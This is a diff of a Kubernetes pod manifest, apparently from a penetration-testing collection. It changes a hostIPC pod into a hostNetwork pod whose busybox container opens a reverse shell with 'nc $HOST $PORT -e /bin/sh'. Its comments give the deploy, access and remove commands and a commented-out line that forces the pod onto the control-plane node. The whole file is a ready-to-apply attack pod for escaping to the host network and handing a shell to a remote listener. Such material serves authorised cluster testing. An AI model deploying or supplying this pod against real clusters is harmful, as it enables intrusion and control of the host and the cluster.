@@ -1,20 +1,20 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostipc-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostipc -- bash
-## Remove: kubectl -n [namespace] delete -f pod-hostipc-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork-revshell.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostnetwork-revshell -- bash
+## Remove: kubectl -n [namespace] delete pod-hostnetwork-revshell
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostipc-revshell
+  name: pod-hostnetwork-revshell
   labels:
     app: pentest
 spec:
-  hostIPC: true
+  hostNetwork: true
   containers:
   - image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    name: hostipc--revshell
+    name: hostnetwork-revshell
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
